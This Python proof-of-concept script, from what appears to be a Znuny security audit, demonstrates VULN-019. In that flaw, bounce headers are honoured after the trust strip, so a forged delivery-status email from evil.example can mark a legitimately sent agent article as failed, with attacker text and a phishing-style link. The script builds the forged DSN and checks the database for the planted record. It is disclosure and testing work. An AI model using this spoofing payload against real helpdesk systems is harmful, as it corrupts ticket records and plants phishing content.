#!/usr/bin/env python3
r"""
VULN-019 — Bounce-detection spoofing bypasses the trusted gate
==============================================================
Vulnerable code : targets/Znuny/Kernel/System/PostMaster/Filter/DetectBounceEmail.pm:59-68
                  (injects X-OTRS-Bounce-* into %GetParam AFTER the trust strip, as a PreFilterModule)
                  targets/Znuny/Kernel/System/PostMaster/FollowUpCheck/BounceEmail.pm:55-73
                  (resolves ticket via ArticleGetByMessageID — attacker-supplied id, no sender check)
Vulnerability   : CWE-345 insufficient authenticity / spoofing

The bounce filter runs as a PreFilterModule AFTER the Trusted strip (PostMaster.pm:581 precedes
PreFilterModules), so the X-OTRS-Bounce-* values it derives from the attacker body are honoured
even for untrusted mail. Follow-up targeting then trusts an attacker-supplied original Message-ID
(ArticleGetByMessageID) with no sender check, so a legitimately-sent agent article can be flagged
failed-to-send with attacker error text on any ticket whose article Message-ID is known.

Proof: create a ticket with an outbound (email) article; feed a synthetic DSN bouncing that
article's Message-ID with attacker error text; observe a send-error record forged on that article.
"""
import os, sys, re
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C
HERE = os.path.dirname(os.path.abspath(__file__))

def main():
    C.banner("VULN-019", "Bounce-detection spoofing bypasses the trusted gate",
             ["DetectBounceEmail.pm injects X-OTRS-Bounce-* after the trust strip; BounceEmail follow-up trusts attacker Message-ID"])
    sfx = C.rid()
    q = C.create_queue(group="users")
    # a ticket with an OUTBOUND email article carrying a known Message-ID (as if the agent emailed the customer)
    msgid = f"<sent-{sfx}@localhost>"
    perl = ("my $T=$Kernel::OM->Get('Kernel::System::Ticket');"
            "my $tid=$T->TicketCreate(Title=>'bounce victim %s',Queue=>'%s',Lock=>'unlock',"
            "Priority=>'3 normal',State=>'open',CustomerID=>'c%s',CustomerUser=>'c%s',OwnerID=>1,UserID=>1);"
            "my $A=$Kernel::OM->Get('Kernel::System::Ticket::Article');"
            "my $B=$A->BackendForChannel(ChannelName=>'Email');"
            "my $aid=$B->ArticleCreate(TicketID=>$tid,IsVisibleForCustomer=>1,SenderType=>'agent',"
            "From=>'support\@localhost',To=>'customer\@example.test',Subject=>'your ticket',"
            "Body=>'outbound reply',Charset=>'utf-8',MimeType=>'text/plain',"
            "MessageID=>'%s',HistoryType=>'SendAnswer',HistoryComment=>'x',UserID=>1);"
            "print 'TID='.$tid.' AID='.$aid.';';" % (sfx, q, sfx, sfx, msgid))
    out = C.perl_eval(perl)[1]
    m = re.search(r"TID=(\d+) AID=(\d+)", out)
    if not m:
        C.failed(f"outbound-article setup failed: {out}")
    tid, aid = int(m.group(1)), int(m.group(2))
    C.log("SETUP", f"victim ticket {tid}, outbound email article {aid} with Message-ID {msgid}")

    err_text = f"ATTACKER-ERROR-{sfx} mailbox full http://attacker.example/phish"
    dsn = (
        "From: Mail Delivery System <mailer-daemon@evil.example>\r\n"
        "To: support@localhost\r\n"
        "Subject: Mail delivery failed: returning message to sender\r\n"
        f"Message-ID: <bounce-{sfx}@evil.example>\r\n"
        "Date: Tue, 29 Sep 2026 12:20:00 +0000\r\n"
        'MIME-Version: 1.0\r\nContent-Type: multipart/report; report-type=delivery-status; boundary="BB"\r\n'
        "\r\n--BB\r\nContent-Type: text/plain; charset=us-ascii\r\n\r\n"
        f"{err_text}\r\n"
        "\r\n--BB\r\nContent-Type: message/delivery-status\r\n\r\n"
        "Reporting-MTA: dns; evil.example\r\n"
        "Final-Recipient: rfc822; customer@example.test\r\nAction: failed\r\nStatus: 5.1.1\r\n"
        "Diagnostic-Code: smtp; 553 mailbox full\r\n"
        "\r\n--BB\r\nContent-Type: message/rfc822\r\n\r\n"
        "From: support@localhost\r\nTo: customer@example.test\r\n"
        f"Message-ID: {msgid}\r\nSubject: your ticket\r\n\r\noutbound reply\r\n"
        "\r\n--BB--\r\n")
    C.log("STEP", "feeding the synthetic DSN (UNTRUSTED) that bounces the victim article's Message-ID")
    C.postmaster_read(dsn, untrusted=True)

    rows = C.db("SELECT se.article_id, se.message_id, se.log_message "
                "FROM article_data_mime_send_error se "
                f"WHERE se.article_id={aid} OR se.message_id='{msgid}'")
    C.log("PROOF", f"forged send-error record on the victim article: {rows}")
    open(os.path.join(HERE, "request.http"), "w").write("(synthetic DSN piped to Maint::PostMaster::Read --untrusted)\n\n" + dsn)
    open(os.path.join(HERE, "response.txt"), "w").write(f"send_error rows: {rows}\n")

    if rows and (err_text.split()[0] in (rows[0][2] or "") or str(aid) == str(rows[0][0])):
        C.confirmed(f"a synthetic, untrusted bounce forged a transmission send-error on the "
                    f"legitimately-sent agent article {aid} (message_id {msgid}) with attacker error "
                    "text — bounce X-OTRS-Bounce-* is honoured after the trust strip and the "
                    "follow-up trusts the attacker-supplied original Message-ID.")
    else:
        C.needs_manual("Sisimai did not classify the synthetic DSN as a bounce (no send-error "
                       "record produced). See notes.md for the manual checklist (a real MTA DSN "
                       "shape Sisimai recognises is required).")

if __name__ == "__main__":
    main()
